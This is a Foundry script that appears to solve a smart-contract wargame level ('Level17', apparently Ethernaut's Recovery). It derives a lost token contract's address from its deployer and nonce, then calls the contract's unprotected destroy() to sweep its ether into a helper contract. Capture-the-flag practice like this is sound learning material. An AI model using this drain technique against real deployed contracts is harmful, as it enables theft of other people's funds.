// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{SimpleToken} from "../src/Level17.sol";
contract Saviour{
    receive() external payable{}
}
contract Level17Solution is Script{
    function run() external{
            //Recover contract deployed the simpleToken contract so recover contract address will be the sender of simpleToken address
            //recover contract address :  0x7531113Bd2Ae41D1aec8C2E2820253cE9373297f
            address sender=address(0x7531113Bd2Ae41D1aec8C2E2820253cE9373297f);
            address payable instance=payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01)))))));
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            SimpleToken simpleToken=SimpleToken(instance);
            
            Saviour s=new Saviour();
            console.log("saviour balance before saving",address(s).balance);
            simpleToken.destroy(payable(address(s)));
            console.log("saviour balance after saving",address(s).balance);
            vm.stopBroadcast();
    }
}